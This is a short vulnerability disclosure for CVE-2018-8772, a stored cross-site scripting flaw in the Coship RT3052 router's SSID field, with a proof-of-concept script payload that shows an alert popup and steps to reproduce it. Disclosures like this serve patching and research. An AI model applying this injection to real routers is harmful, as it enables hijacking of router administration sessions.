######################################################################################
# Exploit Title: Coship RT3052 Wireless Router - Persistent Cross Site Scripting (XSS)
# Date: 2018-03-18
# Exploit Author: Sayan Chatterjee
# Vendor Homepage: http://en.coship.com/
# Category: Hardware (Wifi Router)
# Version: 4.0.0.48
# Tested on: Windows 10
# CVE: CVE-2018-8772
#######################################################################################
 
Proof of Concept
=================
URL: http://192.168.1.254 (Wifi Router Gateway)
Attack Vector : Network Name(SSID)
Payload : <script>alert("S@Y@N")</script>
 
Reproduction Steps:
------------------------------
1. Access the wifi router gateway [i.e, http://192.168.1.254]
2. Go to "Wireless Setting" -> "Basic"
3. Update "Network Name(SSID)" field with '<script>alert("S@Y@N")</script>'
4. Save the settings.
5. Go to "System Status" and you will be having "S@Y@N" popup.

#######################################################################################